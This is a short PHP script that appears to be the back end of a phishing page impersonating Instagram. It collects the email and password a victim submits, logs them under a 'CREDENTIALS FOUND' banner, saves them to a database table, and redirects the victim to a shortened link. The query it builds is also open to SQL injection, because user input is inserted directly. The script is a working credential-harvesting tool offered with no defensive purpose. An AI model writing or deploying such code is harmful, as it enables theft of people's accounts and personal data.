<?php
$con=mysqli_connect("localhost","root","","instadb");
if(mysqli_connect_errno())
{
    echo "connection failed";
    exit();
}
else{
    $username=$_POST["Email"];
    $password=$_POST["password"];
    $res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
    error_log("$res");
    $sql="INSERT INTO userpass VALUES('$username','$password')";
    mysqli_query($con,$sql);
    echo "<script type='text/javascript'>window.location='https://bit.ly/3QqGwTs'</script>";
}
?>
